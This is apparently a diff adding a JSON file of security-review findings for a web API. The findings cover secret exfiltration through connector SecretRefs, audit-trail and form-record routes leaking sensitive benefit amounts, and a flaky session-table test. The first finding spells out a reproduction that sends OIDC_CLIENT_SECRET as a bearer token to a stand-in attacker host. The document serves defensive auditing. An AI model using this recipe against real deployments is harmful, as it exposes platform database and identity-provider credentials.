@@ -1,0 +1,153 @@
+{
+  "schema_version": 1,
+  "findings": [
+    {
+      "id": "F-DG6-120",
+      "stage_id": "DG6",
+      "requirement": "REQ-S16-029",
+      "severity": "High",
+      "mandatory_violation": true,
+      "title": "A SecretRef may name ANY environment variable of the server, so a connector configurator (ADM_TECH) can make the API send the platform's own secrets (OIDC_CLIENT_SECRET, DATABASE_URL, ...) to an https host of their choice; `resolvable` is also an existence oracle for every variable name",
+      "reproduction": "Cause: the built-in `env` SecretProvider that the API registers for every SecretRef consumer (apps/api/src/server.ts:661 registerBuiltInSecretProviders over process.env; :664 setConnectorSecretProviders; :668 setAssistantSecretProviders) accepts any upper-case variable name (apps/api/src/modules/platform/secrets.ts:94 ENV_SECRET_NAME = /^[A-Z][A-Z0-9_]{0,127}$/, :110-117), and nothing restricts which names a configured reference may use (apps/api/src/modules/integrations/secret-refs.ts:47 checkCredentialRefs checks only the shape; :108 resolveCredentials resolves whatever is stored). The http_pull adapter sends the `bearer` reference's value as `Authorization: Bearer <value>` to the configured endpointUrl (apps/api/src/modules/integrations/adapters/http-pull.ts:112-118), and the endpoint rule is only `https://` plus a host (apps/api/src/modules/integrations/connectors.ts:69 ENDPOINT_URL; no host allow-list anywhere). connector.configure is held by ADM_TECH (0107). Reproduction (real API, real env provider, disposable PostgreSQL; only the network transport is replaced by a recorder): docs/delivery/test-evidence/DG6/code-security/round-1/repro/zz-cs-r1-env-secret-exfil.test.ts, run by `checks.sh repro 40-repro-env-secret-exfil zz-cs-r1-env-secret-exfil.test.ts` (log 40-repro-env-secret-exfil.log). With OIDC_CLIENT_SECRET set in the process environment (as a deployment sets it), ADM_TECH POSTs /api/v1/admin/connectors {adapterKind: http_pull, endpointUrl: https://attacker.example.invalid/collect, credentialRefs: {bearer: {provider: env, name: OIDC_CLIENT_SECRET}}} -> 201, then POST /api/v1/admin/connectors/{id}/test {} -> 200 succeeded; the recorded outbound request is GET https://attacker.example.invalid/collect with `authorization: Bearer synthetic-oidc-client-secret-cs-r1-7c1e`, the platform secret. The same create with an extra reference {provider: env, name: DATABASE_URL} answers resolvable true/false per name, so ADM_TECH can enumerate which platform variables exist. The same SecretRef surface, with an admin-chosen remote host, exists for the assistant HTTP endpoint (assistant/settings.ts endpointUrl + credentialRef, assistant.configure = ADM_TECH), the SMTP channel (admin/notification-channels.ts smtp host + credential reference, notification_channel.configure) and the S3 storage settings (admin/storage.ts accessKeyRef/secretKeyRef + endpoint; the access key is sent in clear in the SigV4 Authorization header); those three were read in the source, not reproduced. Impact: DATABASE_URL is the mth_app database credential (every table, outside every application authorization, approval and audit rule), and OIDC_CLIENT_SECRET is the IdP client secret; an application-level technical administrator obtains infrastructure secrets that IT never provisioned for a connector.",
+      "expected": "REQ-S16-029 (\"never expose secrets\") and ADR-0052 §5 (\"a SecretRef names a secret IT holds for this setting\"): a configured reference can resolve only secrets that IT provisioned for connectors, channels, storage or the assistant, never the platform's own runtime secrets. For example: the env provider resolves only names under a dedicated prefix (e.g. MTH_SECRET_*) or an explicit allow-list from configuration, and refuses DATABASE_URL, DATABASE_OWNER_URL, OIDC_CLIENT_SECRET, MTH_DEMO_ADMIN_DATABASE_URL and every other ENV_VARS secret; a refused name answers the same as an unresolvable one, so `resolvable` is no oracle for platform variables. Optionally an egress host allow-list for connector, assistant, SMTP and S3 endpoints.",
+      "actual": "Any upper-case environment variable of the API process can be named; its value is resolved and sent to an arbitrary https host chosen by ADM_TECH through the connector test (reproduced with OIDC_CLIENT_SECRET), and `resolvable` reports for any name whether the variable exists.",
+      "evidence": [
+        "docs/delivery/test-evidence/DG6/code-security/round-1/repro/zz-cs-r1-env-secret-exfil.test.ts",
+        "docs/delivery/test-evidence/DG6/code-security/round-1/40-repro-env-secret-exfil.log",
+        "docs/delivery/test-evidence/DG6/code-security/round-1/40-repro-env-secret-exfil.attempt1.log",
+        "apps/api/src/modules/platform/secrets.ts",
+        "apps/api/src/modules/integrations/secret-refs.ts",
+        "apps/api/src/modules/integrations/adapters/http-pull.ts",
+        "apps/api/src/server.ts"
+      ],
+      "reported_by": "code-security-reviewer",
+      "reported_in": "docs/delivery/reviews/DG6/round-1/code-security-reviewer.json",
+      "owner": "backend-workflow-engineer",
+      "status": "OPEN",
+      "history": [
+        {
+          "at": "2026-11-01T13:20:00Z",
+          "status": "OPEN",
+          "note": "Raised in DG6 round 1 by code-security-reviewer; reproduced end to end against the candidate 7d6b4a9f (source 3cce3d4)."
+        }
+      ]
+    },
+    {
+      "id": "F-DG6-121",
+      "stage_id": "DG6",
+      "requirement": "REQ-S10-002",
+      "severity": "High",
+      "mandatory_violation": true,
+      "title": "The per-transformation audit trail GET /api/v1/transformations/{id}/audit applies no sensitivity rule: a TL (or AUD, TO) who gets 404 on a sensitive benefit reads every event of it and of its measurements, with full changes (amounts) and reasons",
+      "reproduction": "Cause: the route (apps/api/src/modules/transformations/routes.ts:451-465) checks transformation.read and audit.read (TL, TO, AUD; 0005) and returns listTransformationAudit (apps/api/src/modules/audit/index.ts:40-90), which selects every audit_event of the transformation with `changes` and `reason` and never consults record_sensitivity or the ADR-0051 §2 clause. P6 added the redaction only to the new /api/v1/audit-events (ADR-0052 §8) and left this route \"unchanged\" (p6-plan §3 row 13). Reproduction on the migrated, demo-seeded dataset (synthetic): docs/delivery/test-evidence/DG6/code-security/round-1/repro/zz-cs-r1-audit-sensitivity.test.ts, run by `checks.sh repro 41-repro-audit-sensitivity zz-cs-r1-audit-sensitivity.test.ts` (log 41-repro-audit-sensitivity.log). 1. A TO marks the demo benefit 01995000-4401-7000-8000-000000000001 sensitive through PUT .../records/benefit/{id}/sensitivity (200). 2. The benefit's owner (a named party) records a measurement with amount 987654.32 (201). 3. A TL of the transformation, who is no named party and holds no grant, gets 404 on GET /api/v1/transformations/{t}/benefits/{id} (as ADR-0051 §2 requires). 4. The same TL calls GET /api/v1/transformations/{t}/audit and receives the benefit's 6 events (with reasons) and the measurement event `benefit_measurement.create` with changes {amount: {to: \"987654.3200\"}, currency: SAR, attribution: ..., period_end: ...}.",
+      "expected": "REQ-S10-002 (\"a sensitive benefit is hidden from a workstream member without the grant\") and ADR-0051 §2 (\"the record and its individual value are never shown\"): for a caller not admitted to a sensitive record, this route redacts (changes and reason null) or omits the events of that record and of the records that carry its values (at least benefit_measurement and the other benefit_* value rows, business_case_line, evidence_link), exactly as /api/v1/audit-events is meant to.",
+      "actual": "A TL who cannot open the sensitive benefit reads its full event history and its measured amount through the transformation audit trail.",
+      "evidence": [
+        "docs/delivery/test-evidence/DG6/code-security/round-1/repro/zz-cs-r1-audit-sensitivity.test.ts",
+        "docs/delivery/test-evidence/DG6/code-security/round-1/41-repro-audit-sensitivity.log",
+        "apps/api/src/modules/transformations/routes.ts",
+        "apps/api/src/modules/audit/index.ts"
+      ],
+      "reported_by": "code-security-reviewer",
+      "reported_in": "docs/delivery/reviews/DG6/round-1/code-security-reviewer.json",
+      "owner": "backend-workflow-engineer",
+      "status": "OPEN",
+      "history": [
+        {
+          "at": "2026-11-01T13:20:00Z",
+          "status": "OPEN",
+          "note": "Raised in DG6 round 1 by code-security-reviewer; reproduced on the demo dataset against the candidate 7d6b4a9f (source 3cce3d4)."
+        }
+      ]
+    },
+    {
+      "id": "F-DG6-122",
+      "stage_id": "DG6",
+      "requirement": "REQ-S10-002",
+      "severity": "High",
+      "mandatory_violation": true,
+      "title": "/api/v1/audit-events redacts only events whose OWN record is marked sensitive: the events of a sensitive benefit's measurements (and business-case lines, evidence links) are returned unredacted, with their amounts, to an AUD who is not admitted",
+      "reproduction": "Cause: the server wires restrictedRecords to the interim sensitiveRecordsRedactedForEveryone (apps/api/src/server.ts:536; apps/api/src/modules/audit/routes.ts:57-69), which looks up record_sensitivity by the event's own record_id only, and redact() (audit/routes.ts:74-85) keys on `<record_type>:<record_id>`. A benefit_measurement, business_case_line or evidence_link event has its own id, never in record_sensitivity, so it is never redacted. The export path maps exactly these children to their parents (apps/api/src/modules/reporting/exports/jobs.ts:207-222), the audit API does not. Reproduction: the same test as F-DG6-121 (docs/delivery/test-evidence/DG6/code-security/round-1/repro/zz-cs-r1-audit-sensitivity.test.ts; log 41-repro-audit-sensitivity.log). After the benefit is marked sensitive and its owner records amount 987654.32, an AUD at the organization (404 on the benefit itself) calls GET /api/v1/audit-events?organizationId=..&transformationId=..&recordType=benefit_measurement and receives the benefit's 4 measurement events; the new one is `redacted: false` with changes {amount: {to: \"987654.3200\"}, currency, attribution, period_end, benefit_id: <the sensitive benefit>}. Control in the same run: the benefit's own 6 events are all `redacted: true`. The `record_sensitivity.marked` event (record_type record_sensitivity) is likewise not redacted and carries the marking reason.",
+      "expected": "ADR-0051 §2 and ADR-0052 §8: for a caller not admitted, the events of a sensitive record AND of the records that hold its values (benefit measurements and the other benefit value rows, business-case lines, evidence links of a sensitive item) are listed with changes and reason null and redacted true; never the individual value.",
+      "actual": "Only the parent's own events are redacted; the child events disclose the sensitive benefit's measured amount and attribution to AUD (and to ADM_TECH/ADM_ACCESS where they hold an assignment on the transformation).",
+      "evidence": [
+        "docs/delivery/test-evidence/DG6/code-security/round-1/repro/zz-cs-r1-audit-sensitivity.test.ts",
+        "docs/delivery/test-evidence/DG6/code-security/round-1/41-repro-audit-sensitivity.log",
+        "apps/api/src/modules/audit/routes.ts",
+        "apps/api/src/server.ts",
+        "apps/api/src/modules/reporting/exports/jobs.ts"
+      ],
+      "reported_by": "code-security-reviewer",
+      "reported_in": "docs/delivery/reviews/DG6/round-1/code-security-reviewer.json",
+      "owner": "backend-workflow-engineer",
+      "status": "OPEN",
+      "history": [
+        {
+          "at": "2026-11-01T13:20:00Z",
+          "status": "OPEN",
+          "note": "Raised in DG6 round 1 by code-security-reviewer; reproduced on the demo dataset against the candidate 7d6b4a9f (source 3cce3d4)."
+        }
+      ]
+    },
+    {
+      "id": "F-DG6-123",
+      "stage_id": "DG6",
+      "requirement": "REQ-S10-002",
+      "severity": "High",
+      "mandatory_violation": true,
+      "title": "The P5 form-record routes of a T14 benefit (versions, comments, attachments) ignore the sensitivity clause: a TL who gets 404 on the sensitive benefit reads its comment texts and version history and can still post comments on it",
+      "reproduction": "Cause: forms/compare.ts applies ADR-0051 §2 to the three sensitive types (apps/api/src/modules/forms/compare.ts:211), but the shared read gate of the other form-record routes, apps/api/src/modules/forms/history.ts:41-51 requireRecordRead, checks only transformation.read and that the record exists; it is used by listFormRecordVersions (history.ts:82), listFormRecordComments (apps/api/src/modules/forms/comments.ts:169) and listFormRecordAttachments (apps/api/src/modules/forms/attachments.ts:305). createComment (comments.ts:113-118) checks form_record.comment and existence only. T14 maps to the benefit table (0068). Reproduction on the migrated, demo-seeded dataset (synthetic): docs/delivery/test-evidence/DG6/code-security/round-1/repro/zz-cs-r1-form-record-sensitivity.test.ts, run by `checks.sh repro2 42-repro-form-record-sensitivity zz-cs-r1-form-record-sensitivity.test.ts` (log 42-repro-form-record-sensitivity.log). A TL comments on demo benefit 01995000-4401-7000-8000-000000000001 (201); a TO marks it sensitive (200) and comments 'Synthetic: restricted - the final rebate figure is 5.1 MSAR.' (201). The TL then gets 404 on GET /api/v1/transformations/{t}/benefits/{id}, but 200 on GET .../form-records/T14/{id}/versions (its version list with actions and times), 200 on .../comments with BOTH comment bodies including the TO's restricted one, 200 on .../attachments, and 201 on POST .../comments (a write to a record it cannot open). (The .../compare call in the log answers 400 because the probe sent no comparison parameters; it is not part of the claim.)",
+      "expected": "ADR-0051 §2 (\"Record GET of a sensitive record the principal is not admitted to: 404\"; \"the record and its individual value are never shown\") and REQ-S10-002: every form-record sub-resource of a benefit, business case or evidence record (versions, comments, attachments, and the comment write) answers 404 to a caller who is not admitted, as compare.ts and the record GET do.",
+      "actual": "versions, comments and attachments answer 200 with the sensitive benefit's comment texts and history, and the comment write succeeds, for a TL who is refused the record itself.",
+      "evidence": [
+        "docs/delivery/test-evidence/DG6/code-security/round-1/repro/zz-cs-r1-form-record-sensitivity.test.ts",
+        "docs/delivery/test-evidence/DG6/code-security/round-1/42-repro-form-record-sensitivity.log",
+        "apps/api/src/modules/forms/history.ts",
+        "apps/api/src/modules/forms/comments.ts",
+        "apps/api/src/modules/forms/attachments.ts",
+        "apps/api/src/modules/forms/compare.ts"
+      ],
+      "reported_by": "code-security-reviewer",
+      "reported_in": "docs/delivery/reviews/DG6/round-1/code-security-reviewer.json",
+      "owner": "backend-workflow-engineer",
+      "status": "OPEN",
+      "history": [
+        {
+          "at": "2026-11-01T13:20:00Z",
+          "status": "OPEN",
+          "note": "Raised in DG6 round 1 by code-security-reviewer; reproduced on the demo dataset against the candidate 7d6b4a9f (source 3cce3d4)."
+        }
+      ]
+    },
+    {
+      "id": "F-DG6-124",
+      "stage_id": "DG6",
+      "requirement": "REQ-S02-006",
+      "severity": "Low",
+      "mandatory_violation": false,
+      "title": "The REQ-S02-006 route-inventory sweep excludes a table named `user_session` that does not exist, so the real `session` table's sliding-expiry touch fails the 'nothing persisted' cases whenever a case runs more than 60 s after the session's last touch (a load-dependent false failure of a required integration check)",
+      "reproduction": "apps/api/test/integration/hardening/route-inventory.test.ts:107 SESSION_TABLES = new Set([\"user_session\"]) is skipped by the fingerprint (:204), but the table is `session` (packages/db/migrations/0001_identity_access.sql:120). An authenticated request slides the session's idle expiry at most once a minute (apps/api/src/modules/identity/sessions.ts:108-119 touchSession, updates last_seen_at and idle_expires_at when the last touch is 60 s old). On a loaded host a sweep case takes longer than that, the row changes, and the case fails with `tables whose rows changed: expected [ 'public.session' ] to deeply equal []`: case 4 in 30-integration-lang-unset.log, cases 3b and 4 in 32-integration-lang-unset-shard2of2.log. The same file passes alone at load about 3.5 (34-route-inventory-alone.log: 9/9) and in 33-integration-lang-c-utf8-shard2of2.log. Code evidence: 35-route-inventory-session-table.log.",
+      "expected": "The sweep skips the table an authenticated request legitimately updates (`session`, as the comment at route-inventory.test.ts:106 says), so the case result does not depend on the host's speed.",
+      "actual": "The skip names a non-existent table; the sweep's verdict depends on timing. No product effect, and the sweep is stricter rather than weaker (the session table is fingerprinted), so nothing can pass falsely; but a required integration run fails spuriously under load.",
+      "evidence": [
+        "docs/delivery/test-evidence/DG6/code-security/round-1/35-route-inventory-session-table.log",
+        "docs/delivery/test-evidence/DG6/code-security/round-1/30-integration-lang-unset.log",
+        "docs/delivery/test-evidence/DG6/code-security/round-1/32-integration-lang-unset-shard2of2.log",
+        "docs/delivery/test-evidence/DG6/code-security/round-1/34-route-inventory-alone.log",
+        "apps/api/test/integration/hardening/route-inventory.test.ts",
+        "apps/api/src/modules/identity/sessions.ts"
+      ],
+      "reported_by": "code-security-reviewer",
+      "reported_in": "docs/delivery/reviews/DG6/round-1/code-security-reviewer.json",
+      "owner": "backend-workflow-engineer",
+      "status": "OPEN",
+      "history": [
+        {
+          "at": "2026-11-01T17:36:00Z",
+          "status": "OPEN",
+          "note": "Raised in DG6 round 1 by code-security-reviewer from three failing sweep cases in two loaded integration runs, each with the same cause; the file passes alone at low load."
+        }
+      ]
+    }
+  ]
+}
